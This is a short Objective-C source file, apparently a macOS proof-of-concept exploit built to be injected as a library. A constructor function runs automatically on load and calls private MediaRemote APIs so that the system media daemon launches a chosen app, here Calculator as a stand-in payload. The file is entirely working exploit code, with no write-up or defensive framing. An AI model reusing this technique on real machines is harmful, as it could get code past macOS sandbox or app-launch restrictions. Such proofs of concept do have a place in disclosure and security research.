#import <Foundation/Foundation.h>

__attribute__((constructor)) void entry() {
  extern id MRNowPlayingClientCreate(NSNumber *, NSString *);
  extern id MRMediaRemoteSendCommandToClient(int, NSDictionary *, id, id, int, int, id);
  id client = MRNowPlayingClientCreate(nil, @"com.apple.calculator");
  NSDictionary *args = @{@"kMRMediaRemoteOptionDisableImplicitAppLaunchBehaviors" : @NO};
  MRMediaRemoteSendCommandToClient(2, args, nil, client, 1, 0, nil);
  // make sure the process doesn't quit before mediaremoted's answer
  // sleep(2);
}
